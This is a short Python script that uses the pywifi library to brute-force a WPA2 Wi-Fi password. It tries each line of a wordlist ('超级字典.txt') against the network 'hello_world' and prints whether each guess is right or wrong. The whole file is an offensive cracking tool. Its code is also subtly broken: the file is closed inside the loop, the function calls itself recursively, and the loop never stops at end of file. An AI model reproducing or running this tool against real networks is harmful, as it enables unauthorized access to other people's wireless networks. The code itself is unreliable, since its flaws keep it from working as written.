import pywifi
from pywifi import const
import time

#

def wifiConnect(wifiname,wifipassword):
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()[0]
    #disconnect
    ifaces.disconnect()
    time.sleep(0.5)
    if ifaces.status() == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()
        profile.ssid = wifiname
        profile.key = wifipassword
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.auth = const.AUTH_ALG_OPEN
        profile.cipher = const.CIPHER_TYPE_CCMP

        #del_wifi_file
        ifaces.remove_all_network_profiles()
        tep_profile = ifaces.add_network_profile(profile)

        #connectwifi
        ifaces.connect(tep_profile)
        time.sleep(3)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False

def read_password():
    #read
    print("开始破解")
    path = "超级字典.txt"
    file = open(path, 'r')

    while True:
        try:
            wifipwd = file.readline()
            bool = wifiConnect('hello_world', wifipwd)
            if bool:
                print('密码正确：' + wifipwd)
                break
            else:
                print("密码错误：" + wifipwd)
        except:
            continue

        #close
        file.close()

    read_password()

